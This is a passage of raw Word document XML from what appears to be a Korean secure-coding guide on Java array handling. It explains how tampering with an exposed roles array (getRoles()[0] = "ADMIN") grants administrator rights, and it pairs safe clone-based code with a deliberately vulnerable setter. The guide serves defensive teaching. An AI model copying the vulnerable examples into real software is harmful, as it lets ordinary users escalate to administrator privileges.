              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>호출자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> getRoles()[0] = "ADMIN" </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처럼</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>상태를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변조할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>체크</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로직이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변조된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배열을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>참조하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>일반</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>획득합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>복사본을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반환</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>private String[] roles = {"USER", "MANAGER"};</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public String[] getRoles() {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return roles.clone();  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>복사본</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>반환</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="006E1AB2" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  4. Private </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>배열에</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Public </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>데이터</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>할당</w:t>
      </w:r>
      <w:r w:rsidR="006E1AB2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E1AB2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="006E1AB2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>얕은</w:t>
      </w:r>
      <w:r w:rsidR="006E1AB2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E1AB2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>복사</w:t>
      </w:r>
      <w:r w:rsidR="006E1AB2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E1AB2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>금지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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• public </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>메소드의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인자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배열을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> private </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배열에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직접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저장하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인자로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들어온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배열의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복사본을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생성하여</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> private </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변수에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할당한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>넘어온</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배열을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> private</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>private String[] allowedRoles;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public void setAllowedRoles(String[] roles) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    allowedRoles = roles;  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>외부에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> roles </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>배열</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>수정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
